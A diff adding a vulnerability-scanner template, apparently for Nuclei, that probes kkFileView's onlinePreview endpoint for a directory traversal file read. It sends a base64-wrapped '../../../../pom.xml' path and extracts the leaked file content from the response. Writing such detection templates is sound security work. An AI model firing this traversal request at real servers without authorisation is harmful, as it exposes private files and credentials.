@@ -1,0 +1,63 @@
+id: kkfileview-onlinepreview-file-read
+info:
+  name: kkFileView onlinePreview Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Keking kkFileView is a Spring-Boot online preview project. It suffers from a directory traversal vulnerability that allows reading arbitrary files, potentially leading to sensitive file disclosures.
+  reference:
+    - https://forum.butian.net/share/2088
+  metadata:
+    cvss-score: 7.5
+    cve: ""
+    tags: file-read, directory-traversal
+
+variables:
+  filepath: "../../../../pom.xml"
+
+http:
+  - name: File Read Check
+    raw:
+      - |
+        GET /onlinePreview?url={{base64(concat(BaseURL, '/?fullfilename=', filepath))}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: file_content_base64
+        group: 1
+        regex:
+          - '<input hidden id="textData" value="(.*?)"/>'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '<input hidden id="textData" value=".*"/>'
+
+  - name: File Content Verification
+    raw:
+      - |
+        GET /onlinePreview?url={{base64(concat(BaseURL, '/?fullfilename=', filepath))}} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: file_content_decoded
+        group: 1
+        regex:
+          - '<input hidden id="textData" value="(.*?)"/>'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "DOCTYPE html"
